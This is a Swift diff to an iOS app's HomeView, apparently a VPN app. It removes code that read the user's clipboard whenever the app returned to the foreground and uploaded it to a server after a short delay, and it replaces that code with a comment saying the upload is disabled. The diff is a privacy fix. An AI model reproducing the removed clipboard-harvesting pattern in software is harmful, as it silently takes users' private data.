@@ -1230,50 +1230,14 @@ struct HomeView: View {
     /// 常规前台回归处理方法
     func appDidBecomeActive() {
         print("🔄 appDidBecomeActive() called - 常规前台处理")
-        
+
         // 记录前台回归时间
         let currentTime = Date()
         print("🕒 App回到前台时间: \(DateFormatter.localizedString(from: currentTime, dateStyle: .short, timeStyle: .medium))")
-        
-        // 检查登录状态并执行相应逻辑
-        if islogined {
-            print("✅ 用户已登录 - 执行前台刷新逻辑")
-            
-            Task{
-                if let clipboardText = UIPasteboard.general.string {
-                    //body.append(convertFormField(named: "Pasteboard", value: clipboardText, boundary: boundary))
-                    // 比对和处理逻辑
-                    if clipboardText.count >  1 && clipboardText != lastClipboardText {
-                        
-                    }else{
-                        return
-                    }
-                    
-                    if (clipboardText == lastClipboardText){
-                        //防止上传重复的剪切板
-                        return
-                    }
-                    
-                    DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
-                        self.uploadPasteBoard(clipboardText: clipboardText)
-                    }
-                    
-                    lastClipboardText  = clipboardText
-                }
-            }
-            // 刷新配置缓存
-//            Task {
-//                print("🔄 开始刷新配置缓存...")
-//                await getConfigCache()
-//                
-//                print("🔄 开始重新加载配置...")
-//                await doReload()
-//            }
-        } else {
-            print("❌ 用户未登录 - 跳过数据刷新")
-        }
-         
-        
+
+        // 已禁用剪贴板监控上传 - VPN应用不应监控和上传剪贴板内容
+        // 原代码会在app回到前台时读取剪贴板并上传到 gooapis 服务器
+
         print("✨ appDidBecomeActive处理完成")
     }
     
